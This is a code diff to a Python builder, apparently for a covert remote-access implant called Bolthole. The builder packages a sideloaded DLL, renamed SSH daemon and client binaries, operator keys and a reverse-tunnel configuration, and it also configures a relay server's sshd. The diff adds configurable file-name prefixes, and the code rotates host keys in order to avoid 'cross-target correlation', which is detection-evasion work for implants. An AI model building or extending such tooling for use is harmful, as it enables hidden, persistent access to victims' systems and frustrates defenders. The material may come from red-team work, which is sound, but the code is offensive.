@@ -44,6 +44,27 @@ class BoltholeBuilder:
         self._port_list = []
         self._ssh_user_key_name = f"{payload.ssh_user}_key"
 
+    @property
+    def _files_dir_name(self) -> str:
+        p = self.payload.files_prefix
+        return p[0].upper() + p[1:] + "Files"
+
+    @property
+    def _boltd_exe(self) -> str:
+        return f"{self.payload.files_prefix}d.exe"
+
+    @property
+    def _boltcon_exe(self) -> str:
+        return f"{self.payload.files_prefix}con.exe"
+
+    @property
+    def _bolt_key(self) -> str:
+        return f"{self.payload.files_prefix}_key"
+
+    @property
+    def _boltd_config(self) -> str:
+        return f"{self.payload.files_prefix}d-config"
+
     def verify(self):
         if not re.match(r"^[a-zA-Z_][a-zA-Z0-9_]*$", self.payload.name):
             raise Exception("Application name does not match required regex")
@@ -88,9 +109,19 @@ class BoltholeBuilder:
 
     def copy_template_files(self):
         shutil.copytree(BOLTHOLE_SRC_TEMPLATE_DIR, self.temp_dir, dirs_exist_ok=True)
-        boltfiles_dst = os.path.join(self.temp_dir, "BoltFiles")
+        boltfiles_dst = os.path.join(self.temp_dir, self._files_dir_name)
         os.makedirs(boltfiles_dst, exist_ok=True)
         shutil.copytree(BOLTHOLE_BIN_TEMPLATE_DIR, boltfiles_dst, dirs_exist_ok=True)
+        prefix = self.payload.files_prefix
+        for old, new in [
+            ("boltd.exe", f"{prefix}d.exe"),
+            ("boltcon.exe", f"{prefix}con.exe"),
+            ("bolt_key", f"{prefix}_key"),
+        ]:
+            old_path = os.path.join(boltfiles_dst, old)
+            new_path = os.path.join(boltfiles_dst, new)
+            if os.path.exists(old_path) and old_path != new_path:
+                os.rename(old_path, new_path)
         self.logger.debug("Copied template files to %s", self.temp_dir)
 
     def _generate_keypair(self, suffix: str, key_type: str = "ecdsa", bits: int = 256) -> tuple[str, str]:
@@ -135,7 +166,7 @@ class BoltholeBuilder:
             f.write(private_key)
         self.logger.debug("Wrote operator private key to %s", operator_key_path)
 
-        auth_keys_path = os.path.join(self.temp_dir, "BoltFiles", "authorized_keys")
+        auth_keys_path = os.path.join(self.temp_dir, self._files_dir_name, "authorized_keys")
         with open(auth_keys_path, "w") as f:
             f.write(public_key)
             extra = self.payload.operator_pubkey.strip()
@@ -146,10 +177,10 @@ class BoltholeBuilder:
         # Rotate boltd host key — overwrite the static template copy so each
         # deployment presents a unique fingerprint, preventing cross-target correlation.
         bolt_host_private, _ = self._generate_keypair("_bolthole_hostkey", key_type="rsa", bits=2048)
-        bolt_key_path = os.path.join(self.temp_dir, "BoltFiles", "bolt_key")
+        bolt_key_path = os.path.join(self.temp_dir, self._files_dir_name, self._bolt_key)
         with open(bolt_key_path, "w", newline="\n") as f:
             f.write(bolt_host_private)
-        self.logger.debug("Rotated bolt_key host key for build %s", self.buildid)
+        self.logger.debug("Rotated %s host key for build %s", self._bolt_key, self.buildid)
 
     def template_files(self):
         # Rename project files to match payload name
@@ -177,13 +208,18 @@ class BoltholeBuilder:
             "REPLACE_RECONNECT_DELAY_MS", str(self.payload.reconnect_delay * 1000)
         )
         content = content.replace("REPLACE_KEYFILE_NAME", self._ssh_user_key_name)
+        content = content.replace("REPLACE_FILES_DIR", self._files_dir_name)
+        content = content.replace("REPLACE_BOLTD_EXE", self._boltd_exe)
+        content = content.replace("REPLACE_BOLT_KEY_FILE", self._bolt_key)
+        content = content.replace("REPLACE_BOLTD_CONFIG", self._boltd_config)
+        content = content.replace("REPLACE_BOLTCON_EXE", self._boltcon_exe)
 
         with open(program_cs, "w") as f:
             f.write(content)
         self.logger.debug("Templated Program.cs")
 
         # Write boltd-config
-        boltd_config_path = os.path.join(self.temp_dir, "BoltFiles", "boltd-config")
+        boltd_config_path = os.path.join(self.temp_dir, self._files_dir_name, self._boltd_config)
         with open(boltd_config_path, "w") as f:
             f.write(f"Port {self.payload.tunnel_port}\n")
             f.write("ListenAddress 127.0.0.1\n")
@@ -194,7 +230,7 @@ class BoltholeBuilder:
 
         # Write the global outbound private key as {ssh_user}_key.
         # Always ensure a single trailing newline: Windows OpenSSH reports "invalid format" without it.
-        key_path = os.path.join(self.temp_dir, "BoltFiles", self._ssh_user_key_name)
+        key_path = os.path.join(self.temp_dir, self._files_dir_name, self._ssh_user_key_name)
         priv, _ = get_or_generate_keypair()
         normalized_outbound_key = priv.replace("\r\n", "\n").replace("\r", "\n").rstrip("\n") + "\n"
         with open(key_path, "w", newline="\n") as f:
@@ -293,19 +329,19 @@ class BoltholeBuilder:
         ) as f:
             f.write(config_contents)
 
-        # BoltFiles — copy everything from temp_dir/BoltFiles/ with .deploy extension
-        boltfiles_src = os.path.join(self.temp_dir, "BoltFiles")
-        boltfiles_dst = os.path.join(self.build_dir, "BoltFiles")
+        # {prefix}Files — copy everything from temp_dir/{prefix}Files/ with .deploy extension
+        boltfiles_src = os.path.join(self.temp_dir, self._files_dir_name)
+        boltfiles_dst = os.path.join(self.build_dir, self._files_dir_name)
         os.makedirs(boltfiles_dst, exist_ok=True)
         for fname in os.listdir(boltfiles_src):
             src_file = os.path.join(boltfiles_src, fname)
             if os.path.isfile(src_file):
                 shutil.copy(src_file, os.path.join(boltfiles_dst, fname + ".deploy"))
 
-        self.logger.debug("Populated build dir: DLL, sideload, config, BoltFiles")
+        self.logger.debug("Populated build dir: DLL, sideload, config, %s", self._files_dir_name)
 
     def template_manifests(self):
-        boltfiles_dst = os.path.join(self.build_dir, "BoltFiles")
+        boltfiles_dst = os.path.join(self.build_dir, self._files_dir_name)
 
         def sz(path):
             return os.stat(path).st_size
@@ -333,20 +369,25 @@ class BoltholeBuilder:
                     assembly_key=self.sideload_exe.key,
                     assembly_size=self.sideload_exe.size,
                     assembly_config_size=sz(cfg_deploy),
+                    files_dir=self._files_dir_name,
+                    boltd_exe=self._boltd_exe,
+                    boltcon_exe=self._boltcon_exe,
+                    bolt_key_file=self._bolt_key,
+                    boltd_config=self._boltd_config,
                     boltd_size=sz(
-                        os.path.join(boltfiles_dst, "boltd.exe.deploy")
+                        os.path.join(boltfiles_dst, f"{self._boltd_exe}.deploy")
                     ),
                     boltcon_size=sz(
-                        os.path.join(boltfiles_dst, "boltcon.exe.deploy")
+                        os.path.join(boltfiles_dst, f"{self._boltcon_exe}.deploy")
                     ),
                     libcrypto_size=sz(
                         os.path.join(boltfiles_dst, "libcrypto.dll.deploy")
                     ),
                     bolt_key_size=sz(
-                        os.path.join(boltfiles_dst, "bolt_key.deploy")
+                        os.path.join(boltfiles_dst, f"{self._bolt_key}.deploy")
                     ),
                     boltd_config_size=sz(
-                        os.path.join(boltfiles_dst, "boltd-config.deploy")
+                        os.path.join(boltfiles_dst, f"{self._boltd_config}.deploy")
                     ),
                     authorized_keys_size=sz(
                         os.path.join(boltfiles_dst, "authorized_keys.deploy")
@@ -516,8 +557,13 @@ grep -qxF 'AllowTcpForwarding yes' /etc/ssh/sshd_config || \\
     echo 'AllowTcpForwarding yes' >> /etc/ssh/sshd_config
 grep -qxF 'GatewayPorts yes'       /etc/ssh/sshd_config || \\
     echo 'GatewayPorts yes'       >> /etc/ssh/sshd_config
-grep -qxF "AllowUsers $SSH_USER"   /etc/ssh/sshd_config || \\
-    echo "AllowUsers $SSH_USER"   >> /etc/ssh/sshd_config
+if grep -q '^AllowUsers' /etc/ssh/sshd_config; then
+    grep -q "AllowUsers.*$SSH_USER" /etc/ssh/sshd_config || \\
+        sed -i "s/^\\(AllowUsers .*\\)/\\1 $SSH_USER/" /etc/ssh/sshd_config
+    echo "    Appended $SSH_USER to existing AllowUsers line."
+else
+    echo "    No AllowUsers directive found — skipping (existing users unaffected)."
+fi
 
 echo "[*] Adding extra SSH listen ports ({ports_list_str}) ..."
 for PORT in {ports_ufw}; do
